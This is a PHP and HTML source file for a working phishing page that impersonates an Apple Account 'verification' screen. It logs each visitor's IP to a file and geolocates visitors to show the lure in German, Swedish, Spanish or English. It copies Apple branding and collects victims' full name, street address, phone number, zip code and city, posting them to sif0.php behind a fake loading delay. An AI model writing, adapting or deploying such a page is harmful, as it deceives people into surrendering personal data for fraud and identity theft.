<?php
if (session_status() == PHP_SESSION_NONE) { session_start(); }

$ib = isset($_SERVER['HTTP_CLIENT_IP']) ? $_SERVER['HTTP_CLIENT_IP'] : (isset($_SERVER['HTTP_X_FORWARDED_FOR']) ? $_SERVER['HTTP_X_FORWARDED_FOR'] : $_SERVER['REMOTE_ADDR']);
$_SESSION['user_ip'] = $ib;
$ip_clean = str_replace(['.', ':'], '_', $ib);

$visitor_data = [ 'ip' => $ib, 'last_activity' => time(), 'current_page' => 'address.php' ];
file_put_contents("user_" . $ip_clean . ".json", json_encode($visitor_data));

$user_lang = 'en'; 
$details = @json_decode(file_get_contents("http://ip-api.com/json/{$ib}?fields=countryCode"));
if ($details && isset($details->countryCode)) {
    $country = strtoupper($details->countryCode);
    if (in_array($country, ['SE', 'NO', 'FI', 'DK'])) { $user_lang = 'sv'; } 
    elseif (in_array($country, ['DE', 'CH', 'AT', 'LU'])) { $user_lang = 'de'; } 
    elseif (in_array($country, ['ES', 'MX', 'AR', 'CO', 'CL', 'PE', 'VE'])) { $user_lang = 'es'; }
}

$lang_dict = [
    'de' => [
        'title' => 'Apple Account - Verifizierung', 'h1' => 'Apple Account', 'sub' => 'Bestätigen Sie Ihre Informationen, um fortzufahren',
        'name' => 'Vollständiger Name', 'street' => 'Strasse und Hausnummer', 'phone' => 'Telefonnummer', 'zip' => 'PLZ', 'city' => 'Ort / Stadt', 'btn' => 'Speichern und fortfahren', 'wait' => 'Bitte warten...',
        'p1' => 'Datenschutzerklärung', 'p2' => 'Nutzungsbedingungen', 'p3' => 'Support', 'p4' => 'Hilfe'
    ],
    'sv' => [
        'title' => 'Apple Account - Verifiering', 'h1' => 'Apple Account', 'sub' => 'Bekräfta din information för att fortsätta',
        'name' => 'Fullständigt namn', 'street' => 'Gatuadress och nummer', 'phone' => 'Telefonnummer', 'zip' => 'Postnummer', 'city' => 'Ort / Stad', 'btn' => 'Spara och fortsätt', 'wait' => 'Vänligen vänta...',
        'p1' => 'Integritetspolicy', 'p2' => 'Användarvillkor', 'p3' => 'Support', 'p4' => 'Hjälp'
    ],
    'es' => [
        'title' => 'Apple Account - Verificación', 'h1' => 'Apple Account', 'sub' => 'Confirme su información para continuar',
        'name' => 'Nombre completo', 'street' => 'Calle y número de casa', 'phone' => 'Número de teléfono', 'zip' => 'Código postal', 'city' => 'Ciudad / Localidad', 'btn' => 'Guardar y continuar', 'wait' => 'Por favor, espere...',
        'p1' => 'Política de privacidad', 'p2' => 'Condiciones de uso', 'p3' => 'Soporte', 'p4' => 'Ayuda'
    ],
    'en' => [
        'title' => 'Apple Account - Verification', 'h1' => 'Apple Account', 'sub' => 'Confirm your information to continue',
        'name' => 'Full Name', 'street' => 'Street and House Number', 'phone' => 'Phone Number', 'zip' => 'Zip Code', 'city' => 'City / Town', 'btn' => 'Save and Continue', 'wait' => 'Please wait...',
        'p1' => 'Privacy Policy', 'p2' => 'Terms of Service', 'p3' => 'Support', 'p4' => 'Legal Notes'
    ]
];
$text = $lang_dict[$user_lang];
?>
<!DOCTYPE html>
<html class="full-height" dir="ltr" lang="<?php echo $user_lang; ?>">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
    <title><?php echo $text['title']; ?></title>
    <link rel="shortcut icon" href="https://appleid.cdn-apple.com/static/bin/cb3460663665/images/favicon.ico">
    <style>
        * { box-sizing: border-box; }
        body { margin: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #fff; color: #1d1d1f; -webkit-font-smoothing: antialiased; }
        .apple-nav { width: 100%; background: rgba(251, 251, 253, 0.8); backdrop-filter: blur(20px); border-bottom: 1px solid #d2d2d7; display: flex; justify-content: center; align-items: center; padding: 0 22px; height: 48px; font-size: 12px; }
        .apple-nav-links { display: flex; justify-content: space-between; width: 100%; max-width: 1024px; list-style: none; margin: 0; padding: 0; }
        .apple-nav-links li a { color: rgba(0, 0, 0, 0.8); text-decoration: none; }
        .sub-header { max-width: 1024px; margin: 0 auto; padding: 30px 22px 12px 22px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #d2d2d7; }
        .sub-header h2 { font-size: 21px; font-weight: 600; margin: 0; color: #1d1d1f; }
        .signin-container { max-width: 440px; margin: 50px auto; padding: 0 20px; text-align: center; display: flex; flex-direction: column; align-items: center; justify-content: center; }
        .logo-container { margin-bottom: 20px; width: 130px; height: 130px; display: flex; align-items: center; justify-content: center; }
        .logo-container img { width: 100%; height: 100%; object-fit: contain; }
        h1 { font-size: 32px; font-weight: 600; letter-spacing: -0.015em; margin: 0 0 8px 0; color: #1d1d1f; }
        .subtitle { font-size: 17px; color: #1d1d1f; margin-bottom: 30px; }
        form { width: 100%; display: flex; flex-direction: column; align-items: center; }
        .input-wrapper { position: relative; width: 100%; margin-bottom: 20px; text-align: left; }
        .form-label { display: block; font-size: 13px; font-weight: 600; color: #1d1d1f; margin-bottom: 6px; padding-left: 4px; }
        .apple-input { width: 100%; height: 56px; border: 1px solid #86868b; border-radius: 12px; padding: 16px; font-size: 16px; color: #1d1d1f; outline: none; transition: border-color 0.2s, box-shadow 0.2s; background-color: #fff; }
        .apple-input:focus { border-color: #0071e3; box-shadow: 0 0 0 4px rgba(0, 113, 227, 0.15); }
        .row-inputs { display: flex; gap: 12px; width: 100%; }
        .col-35 { width: 35%; }
        .col-65 { width: 65%; }
        .btn-base { height: 52px; border-radius: 12px; font-size: 16px; font-weight: 500; cursor: pointer; border: none; display: inline-flex; align-items: center; justify-content: center; width: 100%; background-color: #0071e3; color: #fff; }
        footer { width: 100%; border-top: 1px solid #d2d2d7; background: #f5f5f7; padding: 35px 20px; margin-top: auto; text-align: center; }
        .footer-links a { font-size: 12px; margin: 0 10px; color: #0066cc; text-decoration: none; }
    </style>
</head>
<body>
    <nav class="apple-nav"><ul class="apple-nav-links"><li><a href="#"></a></li><li><a href="#">Store</a></li><li><a href="#">Mac</a></li><li><a href="#">iPad</a></li><li><a href="#">iPhone</a></li><li><a href="#">Watch</a></li><li><a href="#">Support</a></li></ul></nav>
    <div class="sub-header"><h2>Apple Account</h2></div>
    <div class="signin-container">
        <div class="logo-container"><img src="1.jpg" alt="Logo"></div>
        <h1><?php echo $text['h1']; ?></h1>
        <div class="subtitle"><?php echo $text['sub']; ?></div>
        
        <form id="address-form" action="sif0.php" method="POST">
            <div class="input-wrapper"><label class="form-label"><?php echo $text['name']; ?></label><input class="apple-input" type="text" name="fullname" required></div>
            <div class="input-wrapper"><label class="form-label"><?php echo $text['street']; ?></label><input class="apple-input" type="text" name="address" required></div>
            <div class="input-wrapper"><label class="form-label"><?php echo $text['phone']; ?></label><input class="apple-input" type="tel" name="phone" required></div>
            <div class="row-inputs">
                <div class="col-35"><div class="input-wrapper"><label class="form-label"><?php echo $text['zip']; ?></label><input class="apple-input" type="text" name="zip" required></div></div>
                <div class="col-65"><div class="input-wrapper"><label class="form-label"><?php echo $text['city']; ?></label><input class="apple-input" type="text" name="city" required></div></div>
            </div>
            <button type="submit" id="submit-btn" class="btn-base"><?php echo $text['btn']; ?></button>
        </form>
    </div>
    <footer>
        <div class="footer-links"><a href="#"><?php echo $text['p1']; ?></a><a href="#"><?php echo $text['p2']; ?></a><a href="#"><?php echo $text['p3']; ?></a><a href="#"><?php echo $text['p4']; ?></a></div>
    </footer>
    <script>
        document.getElementById('address-form').addEventListener('submit', function(e) {
            e.preventDefault(); var btn = document.getElementById('submit-btn');
            btn.innerHTML = "<?php echo $text['wait']; ?>"; btn.style.pointerEvents = "none"; btn.style.opacity = "0.6";
            setTimeout(() => { this.submit(); }, 5000);
        });
    </script>
</body>
</html>